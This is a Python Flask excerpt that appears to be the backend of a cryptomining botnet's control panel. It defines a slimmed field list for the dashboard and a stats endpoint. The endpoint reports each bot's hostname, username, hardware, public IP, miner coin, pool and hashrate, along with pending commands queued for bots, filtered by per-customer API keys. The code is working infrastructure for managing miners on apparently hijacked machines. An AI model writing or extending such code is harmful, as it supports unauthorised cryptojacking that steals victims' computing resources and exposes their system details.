# Slim field list: the dashboard renders these 10 columns â€” dropping the
# rest cuts the poll payload (and its JSON parse time) roughly in half.
BOT_SLIM = ("id", "key", "hostname", "username", "os", "cpu", "gpu", "ram_gb",
            "miner_status", "miner_algo", "miner_coin", "miner_dual",
            "miner_disabled", "hashrate", "miner_pool", "public_ip",
            "first_seen", "last_seen")


def _etag(resp, payload):
    """ETag + If-None-Match → 304. Pollers that send the tag back get a
    zero-byte answer whenever nothing changed. no_cache forces the browser
    to revalidate on every poll (the server still auth-checks first), so
    authenticated responses are never served from a stale browser cache."""
    resp.add_etag()
    resp.cache_control.no_cache = True
    return resp.make_conditional(request)


@app.get("/api/panel/stats")
def panel_stats():
    role, uname = _auth()
    if role is None:
        return jsonify({"error": "unauthorized"}), 403
    if role == "user" and not _user_key_active(uname):
        return jsonify({"error": "This account has been suspended."}), 403
    bots = [_row(b) for b in (_q("SELECT * FROM bots ORDER BY last_seen DESC", fetch=True) or [])]
    if role == "user":
        uk = _user_api_key(uname)
        bots = [b for b in bots if (b.get("key") or "") == uk]
    cutoff = (datetime.now(timezone.utc) - timedelta(seconds=_ui_settings()["online_window_secs"])).isoformat(timespec="seconds")
    online = [b for b in bots if (b.get("last_seen") or "") >= cutoff]
    if role == "user":
        ids = [b["id"] for b in bots]
        pending_rows = _q("SELECT bot_id FROM commands WHERE status = 'pending'", fetch=True) or []
        pending = sum(1 for r in pending_rows if r["bot_id"] in ids)
    else:
        pending = (_q("SELECT COUNT(*) AS c FROM commands WHERE status = 'pending'", fetch=True) or [{"c": 0}])[0]["c"]
    payload = {
        "bots": [{k: b[k] for k in BOT_SLIM if k in b} for b in bots],
        "online": len(online),
        "total": len(bots),
        "total_hashrate": round(sum(float(b.get("hashrate") or 0) for b in online), 2),
        "pending_commands": int(pending),
    }
    return _etag(jsonify(payload), payload)


